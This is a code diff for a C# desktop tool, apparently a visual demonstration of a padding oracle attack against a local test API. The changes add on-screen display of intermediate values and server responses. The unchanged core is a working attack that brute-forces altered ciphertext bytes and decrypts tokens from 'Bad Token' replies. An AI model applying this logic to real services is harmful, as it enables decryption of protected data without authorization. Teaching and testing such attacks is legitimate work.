@@ -27,7 +27,6 @@ namespace AttackerVisual
 		private void btnBegin_Click( object sender, EventArgs e )
 		{
 			var blockSize = 16;
-			var millisecondsBetweenRequests = 40;
 			var freqs = MakeGeneralFrequency();
 
 			byte[] origBytes = StringToByteArray( txtEncryptedToken.Text );
@@ -35,6 +34,7 @@ namespace AttackerVisual
 			var plainText = new List<byte>();
 			var totalBlocks = origBytes.Length / blockSize;
 
+			txtFullPlainText.Text = "";
 			for ( var blockIndex = 0; blockIndex < totalBlocks - 1; blockIndex++ )
 			{
 				txtEncryptedToken.SelectionStart = (blockSize * blockIndex) * 2;
@@ -46,10 +46,10 @@ namespace AttackerVisual
 				Application.DoEvents();
 
 				var blockBytes = origBytes.Skip( blockSize * blockIndex ).Take( blockSize * 2 ).ToArray();
-				plainText.AddRange( DecryptBlock( blockSize, blockBytes.ToArray(), freqs, millisecondsBetweenRequests ) );
-
+				plainText.AddRange( DecryptBlock( blockSize, blockBytes.ToArray(), freqs ) );
+				txtFullPlainText.Text = Encoding.ASCII.GetString( plainText.ToArray() );
+				Application.DoEvents();
 			}
-
 		}
 
 		private static byte[] XorByteLists( List<byte> block1, List<byte> block2 )
@@ -94,27 +94,6 @@ namespace AttackerVisual
 			return freq;
 		}
 
-		//public struct PaddingOracleStatus
-		//{
-		//	public string PlainText;
-		//	public List<byte> ByteListModified;
-		//}
-		//private delegate void UpdateStatusDelegate( PaddingOracleStatus status );
-		//private void UpdateStatus( PaddingOracleStatus status )
-		//{
-
-		//	txtEncryptedToken.Text = "asdf";
-			
-		//	//if ( this..InvokeRequired )
-		//	//{
-		//	//	this.Invoke( new UpdateStatusDelegate( this.UpdateStatus ), new object[] { status } );
-		//	//	return;
-		//	//}
-
-		//	txtBlockPlaintext.Text = status.PlainText;
-		//	//this.label1.Text = status;
-		//}
-
 		static void AddASCIIRange( ref string freq, int start, int end )
 		{
 			for ( var i = start; i <= end; i++ )
@@ -128,7 +107,7 @@ namespace AttackerVisual
 		}
 
 
-		List<byte> DecryptBlock( int blockSize, byte[] cipherBytes, string freq, int millisecondsBetweenRequests = 0 )
+		List<byte> DecryptBlock( int blockSize, byte[] cipherBytes, string freq )
 		{
 			txtBlockPlaintext.Text = new String( ' ', blockSize * 2 );
 
@@ -139,15 +118,35 @@ namespace AttackerVisual
 			var iPrime = new List<byte>();
 			for ( var fiddlePos = blockSize - 1; fiddlePos >= 0; fiddlePos-- )
 			{
+
 				for ( var attempt = 0; attempt < 256; attempt++ )
 				{
-					//var fiddleByte = ( blockSize - fiddlePos ) ^ cipherBytes[ fiddlePos ] ^ freq[ attempt ];
-					// make it more understandable (but less efficient) taking the possible bytes in order
+					var paddingValue = (byte)( blockSize - fiddlePos );
+
+					/////
+					var padText = "";
+					for ( var i = 0; i < blockSize - iPrime.Count() -1; i++ )
+					{
+						padText += "  ";
+					}
+					for ( var i = iPrime.Count(); i >= 0; i-- )
+					{
+						padText += String.Format( "{0:x2}", paddingValue );
+					}
+					txtFakeP1.Text = padText;
+					Application.DoEvents();
+					////
+
 					var fiddleByte = attempt;
+					if ( chkCustomFreq.Checked )
+					{
+						fiddleByte = ( blockSize - fiddlePos ) ^ cipherBytes[ fiddlePos ] ^ freq[ attempt ];
+					}
 					byteListModified[ fiddlePos ] = (byte)fiddleByte;
 					
 					var newToken = ByteArrayToString( byteListModified.ToArray() );
 					var isValid = isValidPadding( newToken );
+					var millisecondsBetweenRequests = Convert.ToInt32( txtDelayMs.Value );
 					if ( millisecondsBetweenRequests != 0 )
 					{
 						System.Threading.Thread.Sleep( millisecondsBetweenRequests );
@@ -163,7 +162,6 @@ namespace AttackerVisual
 
 					if ( isValid )
 					{
-						var paddingValue = (byte)( blockSize - fiddlePos );
 						var i2 = (byte)fiddleByte ^ paddingValue;
 						iPrime.Add( (byte)i2 );
 						var c2 = i2 ^ cipherBytes[ fiddlePos ];
@@ -179,6 +177,17 @@ namespace AttackerVisual
 						}
 
 						//////
+						var i2Text = "";
+						for ( var i = 0; i < blockSize - iPrime.Count(); i++ )
+						{
+							i2Text += "  ";
+						}
+						for ( var i = iPrime.Count()-1; i >= 0; i-- )
+						{
+							i2Text += String.Format( "{0:x2}", iPrime[ i ] );
+						}
+						txtI2.Text = i2Text;
+
 						txtBlockPlaintext.Text = "";
 						for ( var i = 0; i < blockSize - plainText.Length; i++ )
 						{
@@ -186,11 +195,11 @@ namespace AttackerVisual
 						}
 						for ( var i = 0; i < plainText.Length; i++ )
 						{
-							txtBlockPlaintext.Text += " " + plainText[ i ] + "-";
+							txtBlockPlaintext.Text += " " + plainText[ i ];
+							if ( txtBlockPlaintext.Text.Length < blockSize * 2 ) txtBlockPlaintext.Text += "-";
 						}
 						Application.DoEvents();
 						//////
-
 
 						break;
 					}
@@ -208,7 +217,7 @@ namespace AttackerVisual
 			return returnBytes;
 		}
 
-		static bool isValidPadding( string token )
+		bool isValidPadding( string token )
 		{
 			var UrlPrefix = "http://localhost:55165/api/transaction?ticket=";
 
@@ -222,7 +231,16 @@ namespace AttackerVisual
 				using ( StreamReader reader = new StreamReader( dataStream ) )
 				{
 					var responseFromServer = reader.ReadToEnd();
+					txtServerResponse.Text = responseFromServer;
 					isValidPadding = !responseFromServer.Contains( "Bad Token" );
+					if ( isValidPadding ) {
+						txtServerResponse.BackColor = Color.Green;
+					}
+					else
+					{
+						txtServerResponse.BackColor = Color.Red;
+					}
+
 				}
 			}
 			RequestCounter++;
